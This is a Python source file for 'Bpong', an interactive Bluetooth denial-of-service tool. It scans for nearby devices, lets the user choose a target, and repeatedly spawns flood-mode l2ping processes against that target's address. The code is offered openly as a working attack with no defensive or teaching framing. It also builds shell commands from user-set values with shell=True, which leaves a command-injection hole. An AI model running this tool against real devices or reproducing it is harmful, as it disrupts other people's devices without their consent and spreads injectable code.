#!/usr/bin/python

# Bpong - Bluetooth Ping Flooding Utility v0.1
# Author: Franco Barpp Gomes (https://github.com/Hyodar)

# -*- coding: utf-8 -*-

# Imported modules
# -----------------------------------------------------------------------------

# If you're getting any errors, install the packages
# libbluetooth and python3-dev with your package manager

import bluetooth as bt
import subprocess
from time import sleep
from os import system

# Constants
# -----------------------------------------------------------------------------

SCAN_DURATION = 15 #s

# Globals
# -----------------------------------------------------------------------------

params = {
    'bdaddr': '',
    'name': '',
    'packet_sz': '600',
    'interface': 'hci0'
}

stored_scan = {
    'bdaddrs': [],
    'names': []
}

# Classes
# -----------------------------------------------------------------------------

class CommandParser:

    def __init__(self, description):
        self.description = description
        self.commands = []
        
        self.add_command(name='exit', aliases=['quit', 'q', 'e'], on_call=exit,
                         help='Exits the script')
        self.add_command(name='help', aliases=['h'], on_call=self.help,
                         help='Prints help info')
        self.add_command(name='clear', aliases=['cls'],
                         on_call=lambda:system('clear'),
                         help='Clears terminal screen')    

    def add_command(self, name, aliases, on_call, help):
        self.commands.append({
            'name': name,
            'aliases': aliases,
            'on_call': on_call,
            'help': help
        })
    
    def help(self):
        print("\n-------------------------------")
        print(self.description)
        for command in self.commands:
            print("\t{}: {}".format(command['name'], command['help']))
        print("-------------------------------\n")

    def parse(self, comm_input):
        for comm in self.commands:
            if comm_input == comm['name'] or comm_input in comm['aliases']:
                comm['on_call']()
                return
        print("[!] The command '{}' does not exist.".format(comm_input))

# Functions
# -----------------------------------------------------------------------------

"""
choose_target()
    Chooses a target from the last scan
"""

def choose_target():

    if not stored_scan['bdaddrs']:
        print("[!] No nearby devices found! Try again.")
        return 0

    target = int(input('[*] Choose target: '))
    params['bdaddr'] = stored_scan['bdaddrs'][target]
    params['name'] = stored_scan['names'][target]
    return 1

# -----------------------------------------------------------------------------

"""
change_target()
    Changes the target to one from the last scan
"""

def change_target():

    for i in range(len(stored_scan['bdaddrs'])):
        print('\t{}. NAME: {} | ADDR: {}'.format(i, stored_scan['names'][i],
              stored_scan['bdaddrs'][i]))
    if choose_target():
        print("[*] Changed target to {}.".format(params['name']))

# -----------------------------------------------------------------------------

"""
scan()
    Scans nearby bluetooth devices to target
"""

def scan():

    devices = bt.discover_devices(lookup_names=True, duration=SCAN_DURATION)
    
    while not devices:
        print("[*] Searching...")
        
        try:
            scan()
        except KeyboardInterrupt:
            print("[!] Stopping scan...")
            return
    
    stored_scan['bdaddrs'] = []
    stored_scan['names'] = []

    index = 0
    for bdaddr, name in devices:
        stored_scan['bdaddrs'].append(bdaddr)
        stored_scan['names'].append(name)
        
        print('\t{}. NAME: {} | ADDR: {}'.format(index, name, bdaddr))
        index += 1
    
    if choose_target():
        print("[*] Target name: {}".format(params['name']))
        print("[*] Everything set up!")

# -----------------------------------------------------------------------------

"""
settings_report()
    Prints a report with all the parameters being used on the attack
"""

def settings_report():

    print("[*] Settings: \n\t\
        * BDADDR: {}\n\t\
        * NAME: {}\n\t\
        * PACKET SIZE: {}\n\t\
        * INTERFACE: {}".format(params['bdaddr'], params['name'],
                             params['packet_sz'], params['interface']))

# -----------------------------------------------------------------------------

"""
run()
    Runs the attack with the parameters set on 'scan' or 'set'
"""

def run():

    if not (params['bdaddr']):
        print("[!] Missing parameters! Run scan or set them manually.")
        return
    
    print("[*] Running attack...")
    settings_report()

    try:
        for i in range (10000):
            xterm_1 = 'l2ping -i {} -s {} -f {} &'.format(params['interface'],
                                                          params['packet_sz'],
                                                          params['bdaddr'])
            print("[*] Sending packet no {}...".format(i))
            subprocess.Popen(xterm_1, stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE, shell=True)

            sleep(3)
    except (KeyboardInterrupt, OSError):
        print("[!] Exception! Exiting...")

# -----------------------------------------------------------------------------

"""
set_params(comm)
    Parameters: - str comm: Inserted command

    Runs the attack with the parameters set on 'scan' or 'set'
"""

def set_params():

    print("[*] Parameters: bdaddr, name, packet_sz, interface")
    param, value = input("[*] Insert '<param> <value>':").split(' ')

    if param in params.keys():
        params[param] = value
        print("[*] Parameter '{}' set to '{}'!".format(param, value))
    else:
        print("[!] Parameter '{}' does not exist.".format(param))
# -----------------------------------------------------------------------------

"""
setparser()
    Adds all the commands to a command parser
"""

def setparser():

    parser = CommandParser(description='Bpong v0.1')
    
    parser.add_command(name='scan', aliases=['s'], on_call=scan,
                       help='Scans for nearby devices and configs the attack')
    parser.add_command(name='run', aliases=['flood', 'ping', 'r'], on_call=run,
                       help='Runs the attack')
    parser.add_command(name='chg', aliases=['new'], on_call=change_target,
                       help='Changes the target to one of the stored ones')
    parser.add_command(name='settings', aliases=[], on_call=settings_report,
                       help='Prints a report with the current config')
    parser.add_command(name='set', aliases=[], on_call=set_params,
                       help='Sets parameters values manually')

    return parser

# -----------------------------------------------------------------------------
# Main
# -----------------------------------------------------------------------------

def main():

    parser = setparser()

    while True:
        comm = input('bpong> ')
        parser.parse(comm)

if __name__ == '__main__':
    main()